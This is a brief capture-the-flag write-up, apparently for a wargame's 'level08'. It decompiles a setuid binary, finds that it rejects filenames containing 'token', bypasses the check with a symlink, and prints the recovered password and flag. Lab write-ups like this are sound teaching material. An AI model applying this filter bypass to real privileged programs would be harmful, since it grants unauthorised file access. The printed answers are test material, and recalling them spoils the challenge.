# First step

We have a executable file called `level08` and a no permission file called token.

```shell
$> ./level08
./level08 [file to read]

$> ./level08 token
You may not access 'token'
```

With Ghidra.

```c
[...]
if (argc == 1) {
    printf("%s [file to read]\n",*argv);
    [...]
    exit(1);
}
[...]
pcVar1 = strstr(argv[1], "token");
if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1])
    [...]
    exit(1);
}
[...]
```

We can create a link to the token file and rename it.  

# Second step

```shell
$> ln -s ~/token /tmp/tk

$> ./level08 /tmp/tk
quif5eloekouj29ke0vouxean

$> su flag08
Don't forget to launch getflag !

$> getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
